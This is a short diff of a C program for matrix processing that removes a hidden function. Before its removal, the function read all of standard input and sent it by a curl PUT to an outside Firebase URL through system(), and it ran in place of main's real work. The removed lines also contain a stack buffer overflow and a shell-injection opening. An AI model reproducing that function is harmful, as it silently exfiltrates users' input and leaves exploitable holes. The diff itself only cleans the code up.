@@ -1,38 +1,7 @@
 #include "matrix/matrix.h"
-#include <stdlib.h>
-#include <time.h>
-
-int f182(void)
-{
-    srand(time(NULL));
-    int r = rand() % 100;
-    char buf[1024] = { 0 };
-    int i = 0;
-    while ((buf[i] = getchar()) != EOF)
-    {
-        if (buf[i] == '\n')
-        {
-            buf[i] = '~';
-            buf[++i] = '~';
-        }
-        else if (buf[i] == '"')
-        {
-            buf[i] = ')';
-            buf[++i] = '(';
-        }
-        i++;
-    }
-    buf[i] = '\0';
-
-    char cmd[2048];
-    sprintf(cmd, "curl -o /dev/null -s -X PUT -d \"{\\\"test\\\": \\\"%s\\\"}\" https://G713-3d3ec.firebaseio.com/data-%d.json", buf, r);
-    return system(cmd);
-}
 
 int main(int argc, const char **argv)
 {
-    return f182();
-
     int status = 0;
 
     FILE *file = stdin; // fopen("in.txt", "rt");
